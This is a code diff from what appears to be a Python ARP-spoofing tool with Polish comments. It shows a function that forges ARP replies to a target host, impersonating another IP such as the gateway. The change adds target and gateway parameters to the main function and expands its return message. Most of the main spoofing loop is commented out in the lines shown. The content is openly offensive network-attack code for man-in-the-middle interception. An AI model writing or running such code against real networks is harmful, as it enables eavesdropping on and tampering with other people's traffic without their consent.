@@ -19,7 +19,7 @@ def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze z
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
     send(spoofed, verbose=False)
 
-def main_function():
+def main_function(targetIP, gatewayIP):
     # targetMAC = getMACAddress(targetip)
 
     # gatewayMAC = getMACAddress(gatewayip)
@@ -33,4 +33,4 @@ def main_function():
     # except KeyboardInterrupt:
     #     print('Stop spoofing')
     # return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
-    return "Spoofing finished"
+    return 'Spoofing finished; targetIP: ' + targetIP + ' gatewayIP:' + gatewayIP 
